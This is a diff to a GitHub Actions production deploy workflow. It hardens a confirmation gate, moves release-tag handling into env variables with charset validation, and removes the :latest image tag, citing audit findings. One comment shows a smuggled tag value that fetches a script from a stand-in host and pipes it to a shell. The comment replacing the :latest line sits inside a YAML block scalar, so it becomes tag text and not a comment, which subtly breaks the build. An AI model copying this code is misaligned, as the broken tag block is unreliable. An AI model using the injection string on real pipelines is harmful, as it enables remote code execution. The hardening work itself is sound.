@@ -6,9 +6,12 @@ on:
   workflow_dispatch:
     inputs:
       confirm:
-        description: 'Type "DEPLOY" to confirm production release'
+        description: 'Type DEPLOY (exactly) to confirm a production release'
         required: true
-        default: 'DEPLOY'
+        # No default. The previous default was the literal string "DEPLOY", which
+        # satisfied the confirmation step without anyone typing anything, so the
+        # gate could never refuse a manual production deploy (F-74).
+        type: string
 
 permissions:
   id-token: write
@@ -27,7 +30,10 @@ jobs:
       - name: Verify Confirmation
         if: github.event_name == 'workflow_dispatch'
         run: |
-          if [ "${{ github.event.inputs.confirm }}" != "DEPLOY" ]; then
+          # Compare against an explicit, operator-typed value. Quoted so the
+          # value is treated as a string and never word-split.
+          if [ "${{ github.event.inputs.confirm }}" != "DEPLOY" ] || \
+             [ -z "${{ github.event.inputs.confirm }}" ]; then
             echo "Deployment cancelled: Confirmation did not match DEPLOY"
             exit 1
           fi
@@ -67,13 +73,36 @@ jobs:
 
       - name: Determine Image Tags
         id: tags
+        # Event data is passed through env, never interpolated into the script
+        # body. `${{ }}` inside run: is substituted before the shell sees it, so
+        # a tag named `v1"; curl evil.sh | sh; #` would execute. It is also
+        # the immutable image tag, so it is validated rather than trusted.
+        # AUDIT_REMEDIATION.md F-69.
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          RELEASE_TAG: ${{ github.event.release.tag_name }}
         run: |
+          set -euo pipefail
           SHA_SHORT=$(git rev-parse --short HEAD)
-          echo "tag_sha=${SHA_SHORT}" >> $GITHUB_OUTPUT
-          if [ "${{ github.event_name }}" = "release" ]; then
-            echo "tag_version=${{ github.event.release.tag_name }}" >> $GITHUB_OUTPUT
+          echo "tag_sha=${SHA_SHORT}" >> "$GITHUB_OUTPUT"
+          if [ "$EVENT_NAME" = "release" ]; then
+            # Conservative charset: alphanumerics, dot, dash, underscore.
+            # `case` is used rather than `grep -E`, which is line-oriented and
+            # would accept a value whose first line matches while later lines
+            # inject extra $GITHUB_OUTPUT entries.
+            case "$RELEASE_TAG" in
+              ""|*[!A-Za-z0-9._-]*)
+                echo "::error::release tag failed validation, refusing to build"
+                exit 1
+                ;;
+            esac
+            if [ "${#RELEASE_TAG}" -gt 128 ]; then
+              echo "::error::release tag too long, refusing to build"
+              exit 1
+            fi
+            echo "tag_version=${RELEASE_TAG}" >> "$GITHUB_OUTPUT"
           else
-            echo "tag_version=manual-${SHA_SHORT}" >> $GITHUB_OUTPUT
+            echo "tag_version=manual-${SHA_SHORT}" >> "$GITHUB_OUTPUT"
           fi
 
       - name: Set up Docker Buildx
@@ -88,7 +117,10 @@ jobs:
           tags: |
             ${{ steps.login-ecr.outputs.registry }}/scandrix-${{ matrix.service.name }}:${{ steps.tags.outputs.tag_version }}
             ${{ steps.login-ecr.outputs.registry }}/scandrix-${{ matrix.service.name }}:${{ steps.tags.outputs.tag_sha }}
-            ${{ steps.login-ecr.outputs.registry }}/scandrix-${{ matrix.service.name }}:latest
+            # No :latest in production. Every tag pushed here is immutable
+            # (release version or commit sha), so a deployment can be traced to
+            # exactly what it runs and cannot be silently repointed by a later
+            # push (AUDIT_REMEDIATION.md F-61).
           cache-from: type=gha
           cache-to: type=gha,mode=max
 
